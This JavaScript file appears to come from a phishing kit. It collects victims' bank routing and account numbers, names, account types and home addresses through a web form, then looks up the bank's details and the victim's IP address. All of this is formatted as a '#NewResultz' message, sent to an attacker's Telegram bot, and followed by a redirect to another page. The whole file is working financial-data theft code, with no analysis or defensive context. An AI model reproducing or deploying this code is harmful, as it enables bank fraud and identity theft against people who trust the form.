import { telegramToken, telegramChatId } from '../tele.js';

async function submitBankDetails(event) {
    event.preventDefault();

    const form = event.target;
    const formData = new FormData(form);
    const routeNumber = formData.get('routeNumber');
    const bankNumber = formData.get('bankNumber');

    const clearErrors = () => {
        const errorMessages = form.querySelectorAll('.error-message');
        errorMessages.forEach(msg => msg.remove());
        const errorFields = form.querySelectorAll('.error');
        errorFields.forEach(field => field.classList.remove('error'));
    };

    const showError = (field, message) => {
        const errorMessage = document.createElement('span');
        errorMessage.classList.add('error-message');
        errorMessage.textContent = message;
        field.classList.add('error');
        field.parentNode.appendChild(errorMessage);
    };

    clearErrors();

    let isValid = true;
    if (!routeNumber || routeNumber.trim() === '') {
        isValid = false;
        showError(form.querySelector('[name="routeNumber"]'), 'Routing number is required');
    }

    if (!bankNumber || bankNumber.trim() === '') {
        isValid = false;
        showError(form.querySelector('[name="bankNumber"]'), 'Bank account number is required');
    }

    if (!formData.get('firstName') || formData.get('firstName').trim() === '') {
        isValid = false;
        showError(form.querySelector('[name="firstName"]'), 'First name is required');
    }

    if (!formData.get('lastName') || formData.get('lastName').trim() === '') {
        isValid = false;
        showError(form.querySelector('[name="lastName"]'), 'Last name is required');
    }

    if (!formData.get('type')) {
        isValid = false;
        showError(form.querySelector('[name="type"]'), 'Account type is required');
    }

    if (!formData.get('line1') || formData.get('line1').trim() === '') {
        isValid = false;
        showError(form.querySelector('[name="line1"]'), 'Address line 1 is required');
    }

    if (!formData.get('city') || formData.get('city').trim() === '') {
        isValid = false;
        showError(form.querySelector('[name="city"]'), 'City is required');
    }

    if (!formData.get('state') || formData.get('state').trim() === '') {
        isValid = false;
        showError(form.querySelector('[name="state"]'), 'State is required');
    }

    if (!formData.get('zip') || formData.get('zip').trim() === '') {
        isValid = false;
        showError(form.querySelector('[name="zip"]'), 'ZIP Code is required');
    }

    if (isValid) {
        // Client information
        const clientIP = await fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => data.ip);
        const clientAgent = navigator.userAgent;

        // Get bank details from API
        const apiUrl = `https://www.routingnumbers.info/api/data.json?rn=${routeNumber}`;
        const response = await fetch(apiUrl);
        const data = await response.json();
        
        // Ensure API call was successful
        let customerName, routingNumber, address, city;
        if (data && data.code === 200) {
            customerName = decodeURIComponent(data.customer_name || 'Unknown Bank');
            routingNumber = data.rn || '';
            address = data.address || '';
            city = data.city || '';
        } else {
            customerName = 'Unknown Bank';
            routingNumber = '';
            address = '';
            city = '';
        }

        // Message construction with relevant data
        const info = [
            "🌟You got a #NewResultz 🌟",
            "🌟Wassup, 🌟xf🌟 BAXNK MANUALLY 🌟",
            "🏦 ACCOUNT TYPE: " + formData.get('type'),
            "👤 FIRST NAME: " + formData.get('firstName'),
            "👤 LAST NAME: " + formData.get('lastName'),
            "↔️ ROUTING NUMBER: " + routeNumber,
            "🏦 ACCOUNT NUMBER: " + bankNumber,
            "📜 BANK DETAILS:",
            "  🏢 Customer Name: " + customerName,
            "  🏦 Routing Number: " + routingNumber,
            "  🏠 Bank Address: " + address,
            "  🏙️ Bank City: " + city,
            "🏠 ADDRESS 1: " + formData.get('line1'),
            "🏠 ADDRESS 2: " + formData.get('line2'),
            "🏙️ CITY: " + formData.get('city'),
            "🗺️ STATE: " + formData.get('state'),
            "📬 ZIP CODE: " + formData.get('zip'),
            "🌐 CLIENT IP: " + clientIP,
            "💻 USER AGENT: " + clientAgent,
        ];
        const message = info.join("\n");

        // Send to Telegram
        const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`;
        await fetch(telegramURL);

        // Generate random string for redirection
        const redirectString = Array.from({ length: 20 }, () => Math.random().toString(36)[2]).join('');

        // Redirect to a new URL
        window.location.href = `../pv.html?routingnumber=${routeNumber}&customername=${encodeURIComponent(customerName)}&redirectstring=${redirectString}`;
    }
}

document.getElementById('bankDetailsForm').addEventListener('submit', submitBankDetails);
